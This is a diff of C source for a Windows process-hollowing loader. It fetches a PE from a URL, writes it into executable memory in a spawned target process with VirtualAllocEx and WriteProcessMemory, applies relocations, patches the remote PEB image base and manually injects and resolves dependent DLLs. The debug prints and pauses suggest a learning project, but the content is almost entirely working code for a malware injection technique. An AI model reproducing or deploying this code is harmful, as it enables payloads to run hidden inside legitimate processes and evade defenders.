@@ -10,7 +10,7 @@
 PROCESS_INFORMATION spawn(char *processPath){
 STARTUPINFOA stInfo={0};
 stInfo.cb=sizeof(stInfo);
-PROCESS_INFORMATION pInfo;
+PROCESS_INFORMATION pInfo={0};
 if(CreateProcessA(
 processPath,
 NULL,
@@ -80,13 +80,10 @@ BYTE* fetchPE(char* url){
     return pe;
 }
 
-// objective: parse PE. return list of struct containing each essential sectton size.
-// dos ---> nt head ----> file head / opt head 
-// opt head ---> data directories
-// 
+
 MappingMetadata PEParser(BYTE* pe){
+    // works entirely on heap
     MappingMetadata mm;
-    // pe file base 
     mm.heapBase=pe;
     unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
     unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
@@ -110,15 +107,50 @@ MappingMetadata PEParser(BYTE* pe){
 
 
 
-void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
-    // abstract mapping routine X
+char* mapRoutineX(HANDLE proc,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
+    char* remoteV=(char*)VirtualAllocEx(
+        proc,
+        (void*)mm.preferedBase,
+        (SIZE_T)mm.imageSize,
+        MEM_COMMIT | MEM_RESERVE,
+        0x40
+    );
+
+    if(!remoteV)
+        remoteV=(char*)VirtualAllocEx(
+            proc,
+            NULL,
+            (SIZE_T)mm.imageSize,
+            MEM_COMMIT | MEM_RESERVE,
+            0x40
+        );
+
+    bool prefAlloc=false;
+    if((unsigned long long)remoteV == (unsigned long long)mm.preferedBase)
+        prefAlloc=true;
+
+    printf("new base address of target process/dll: %lu\n",remoteV);
+
+    if(WriteProcessMemory(
+        proc,
+        remoteV,
+        mm.heapBase,
+        mm.headersSize,
+        NULL
+    )){
+        printf("headers has been written. check with debugger. then enter to continue\n");
+        getchar();
+    };
+    
+
+    
     IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
     unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
 
     for(int i=0; i<mm.ImageSectionsCount; i++){
     char* name=(char*)(sec->Name);
     
-    if(strcmp(name,".reloc")==0){
+    if(strcmp(name,".reloc")==0 && !prefAlloc){
         printf(".reloc ---- %i|||| base: %llu\n",sec->SizeOfRawData,(unsigned long long)sec);
         *reloc=sec;
         sec++;
@@ -182,6 +214,7 @@ void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEAD
     sec++;
     }
     printf("all sections has been mapped!\n");
+    return remoteV;
 }
 
 
@@ -263,9 +296,10 @@ void dumpLoadedDlls(char** dllList,size_t capacity){
 }
 
 // vergiliusproject.com 
-bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,char*** loadedDlls,size_t capacity){
+bool injectDLL(HANDLE proc,char* dll,char*** loadedDlls,size_t capacity){
     // for dll injection i had 2 options.
     // 1. open file normally and parse it and write to allocated mem in process.
+    // classic writeProcessmem + virtualallocex
     // 2. create section object backed by PE file.
     // prefered second. because windows memory manager applies rellocation
     // in that case. but i have to fill IAT still + load dll s recurisively if necess.
@@ -277,9 +311,9 @@ bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,cha
     HANDLE hDll=CreateFileA(
         dll_file,
         GENERIC_READ,
-        0,
+        FILE_SHARE_READ,
         NULL,
-        OPEN_ALWAYS,
+        OPEN_EXISTING,
         FILE_ATTRIBUTE_NORMAL,
         NULL
     );
@@ -288,42 +322,31 @@ bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,cha
         printf("[-] REQUIRED DLL IS NOT PRESENT ON THE SYSTEM!\n");
         exit(1);
     }
-    // this fn fails
-    HANDLE sectionObjectHandle=CreateFileMappingA(
+    
+    DWORD onDiskSz=GetFileSize(hDll,NULL);
+    char* dll_buff=(char*)malloc(onDiskSz);
+    if(!ReadFile(
         hDll,
+        dll_buff,
+        onDiskSz,
         NULL,
-        PAGE_READONLY | SEC_IMAGE,
-        0,
-        0,
         NULL
-    );
-    if(sectionObjectHandle)
-        printf("section object for dll file: %s is created\n",dll_file);
-    else    
-        exit(1);
-    SIZE_T viewSz=0;
-    void *dllBase=NULL;
-    NTSTATUS mappedSection=NtMapViewOfSection(
-        sectionObjectHandle,
-        proc,
-        &dllBase,
-        0,
-        0,
-        NULL,
-        &viewSz,
-        ViewUnmap,
-        0,
-        PAGE_EXECUTE_READ
-    );
-
-    if(mappedSection!=0x00000000){
-        printf("[-] FAILED TO MAP SECTION OBJECT IN VA SPACE. 299\n");
+    )){
+        printf("[-] 337 failed to read dll file\n");
         exit(1);
     }
-    printf("section object of type SEC_IMAGE for DLL file has been mapped to va space of process.check debugger\n");
-    getchar();
+
+    MappingMetadata dll_mm=PEParser(dll_buff);
+    void* dll_relloc=NULL;
+    char* dllBase=mapRoutineX(proc,dll_mm,&dll_relloc);
+
+    if(dll_relloc)
+        rellocate(proc,dllBase,dll_mm.heapBase,dll_mm.preferedBase,dll_relloc);
+
     syncLoadedDlls(dll,loadedDlls,capacity);
-    resolveIAT(proc,dllBase,NtMapViewOfSection,loadedDlls,capacity);
+
+    
+    resolveIAT(proc,dllBase,loadedDlls,capacity);
     
     // return essential info for filling IAT for those image depending on this dll
     unsigned long long test=0xFF;
@@ -334,6 +357,9 @@ bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,cha
 
 bool isDllLoaded(char* dll,char** loaded_list,size_t capacity){
     unsigned int count=(unsigned int)(capacity/sizeof(char*));
+    for(unsigned int i=0;i<count;i++)
+    if(strcmp(dll,loaded_list[i])==0)
+            return true;
     return false;
 
 }
@@ -344,7 +370,7 @@ void* extractDllExportTable(){
 }
 
 // should work for both main PE and loaded DLLs
-void resolveIAT(HANDLE proc,BYTE* imageBase,T_NtMapViewOfSection NtMapViewOfSection,char*** loadedDlls,size_t capacity){
+void resolveIAT(HANDLE proc,BYTE* imageBase,char*** loadedDlls,size_t capacity){
     unsigned long long e_lfanew=(unsigned long long)(imageBase+0x3c);
     long e_lfanew_val=0;
     ReadProcessMemory(
@@ -448,7 +474,7 @@ void resolveIAT(HANDLE proc,BYTE* imageBase,T_NtMapViewOfSection NtMapViewOfSect
         }
         else
         {
-            unsigned long long base=injectDLL(proc,__dll__name,NtMapViewOfSection,loadedDlls,capacity);
+            unsigned long long base=injectDLL(proc,__dll__name,loadedDlls,capacity);
             // apply IAT resolving 
 
         }
@@ -464,9 +490,6 @@ bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
 HANDLE self=GetCurrentProcess();
 HMODULE ntdll=GetModuleHandleA("ntdll");
 T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
-T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
-if(NtMapViewOfSection)
-    printf("Address of NtMapViewOfSection: %p\n",NtMapViewOfSection);
 T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
 T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");
     
@@ -525,53 +548,23 @@ getchar();
 printf("continiueueueuing execution\n");
 
 
-// compare PEParser to  reversing pe fields.
 MappingMetadata mm=PEParser(pe);
 printf(
     "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
     mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
 );
 
-char* remoteV=(char*)VirtualAllocEx(
-proc,
-(void*)mm.preferedBase,
-(SIZE_T)mm.imageSize,
-MEM_COMMIT | MEM_RESERVE,
-0x40
-);
-
-if(!remoteV)
-    remoteV=(char*)VirtualAllocEx(
-        proc,
-        NULL,
-        (SIZE_T)mm.imageSize,
-        MEM_COMMIT | MEM_RESERVE,
-        0x40
-);
-
-printf("new base address of target process: %lu\n",remoteV);
-
-if(WriteProcessMemory(
-    proc,
-    remoteV,
-    mm.heapBase,
-    mm.headersSize,
-    NULL
-)){
-    printf("headers has been written. check with debugger. then enter to continue\n");
-    getchar();
-};
 
 IMAGE_SECTION_HEADER *reloc=NULL;
+char* remoteV=NULL;
 if(!KERNEL_STYLE){
-    mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();
+    remoteV=mapRoutineX(proc,mm,&reloc); // ELSE mapRoutineY();
     printf("sections has been mapped! check with debugger\n");
     getchar();
 }
-if(mm.preferedBase!=(unsigned long long)remoteV && reloc!=NULL)
+
+if(reloc!=NULL)
     rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
-
-
 
 // adjusting image base in remote PEB
 
@@ -586,17 +579,12 @@ if(!WriteProcessMemory(
     exit(1);
 }
 
-
-
-
-
-
 char* native="ntdll.dll";
 size_t capacity=sizeof(char*);
 char** loadedDlls=malloc(capacity);
 loadedDlls[0]=native;
 
-resolveIAT(proc,remoteV,NtMapViewOfSection,&loadedDlls,capacity);
+resolveIAT(proc,remoteV,&loadedDlls,capacity);
 
 dumpLoadedDlls(loadedDlls,capacity);
 
